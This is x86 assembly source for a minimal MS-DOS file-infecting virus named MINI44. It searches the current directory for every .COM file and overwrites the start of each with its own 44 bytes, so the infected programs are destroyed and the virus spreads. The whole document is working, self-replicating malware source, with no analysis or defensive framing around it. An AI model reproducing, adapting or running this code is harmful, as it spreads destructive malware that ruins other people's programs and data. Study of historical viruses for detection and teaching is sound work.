.model small
.code
ORG 100h
FNAME EQU 9Eh

MINI44:
	mov AH, 4Eh ; SEARCH FIRST
	mov DX, offset COMP_FILE
	int 21h
SEARCH_LP:
	jc DONE
	
	mov AX, 3D01h ; OPEN
	mov DX, FNAME
	int 21h
	
	xchg AX, BX
	mov AH, 40h ; WRITE myself as virus
	mov CL, 44
	mov DX, 100h
	int 21h
	
	mov AH, 3Eh ; CLOSE
	int 21h
	
	mov AH, 4Fh ; SERACH NEXT
	int 21h
	jmp SEARCH_LP
	
DONE:
	ret
	
COMP_FILE	DB	'*.COM',0
FINISH:
	END MINI44